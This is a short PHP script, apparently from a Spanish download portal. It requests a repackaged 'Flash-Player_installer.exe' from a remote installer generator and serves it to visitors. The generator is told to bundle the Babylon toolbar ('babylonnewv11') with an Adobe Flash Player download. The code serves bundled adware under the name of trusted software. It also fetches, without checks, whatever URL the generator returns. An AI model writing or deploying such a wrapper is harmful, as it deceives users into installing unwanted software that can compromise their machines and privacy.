<?php
        $country = strtolower($_SERVER["GEOIP_COUNTRY_CODE"]); // aquí se debería coger por geopip

        // variables que tienes que configurar
        $installer_generator_url = "http://download.descargar.es/installers/down.php";
        $url_download = "http://pf.dlvit.com/s/3/8/38359-667794-adobe-flash-player-firefox-netscape-opera.exe";
        $software = "Flash-Player";
        $hostname = rawurlencode("flashplayer.descargar.es");
        $lang = rawurlencode("pt");
        $installer_lang_utf8 = "Portuguese";
        $installer_toolbar = "babylonnewv11";

        //Conf interna
        $installer_name = $software . "_installer.exe";
        $software_ue = rawurlencode($software);
        $p_var = rawurlencode($_GET['p']);
        $key = substr(md5($hostname . $lang . $url_download . $software . $country. "mikey"),0,5);
        $url_download = rawurlencode($url_download);

        $installer_generator = $installer_generator_url . "?key=" . $key . "&new=y&lang=" . $lang . "&hostname=" . $hostname . "&url_download=" . $url_download . "&software=" . $software_ue . "&country=" . $country . "&tb=" . $installer_toolbar . "&ud=ax&origen=" . $p_var . "&langutf8=" . $installer_lang_utf8;

        //URL instalador
        $file = @file_get_contents($installer_generator);

        header("Content-disposition: attachment; filename=$installer_name");
        header("Content-type: application/octet-stream");
        print file_get_contents($file,false,stream_context_create(array('http'=>array('method'=>'GET','header'=>'X-Real-IP: '.$_SERVER['REMOTE_ADDR']))));

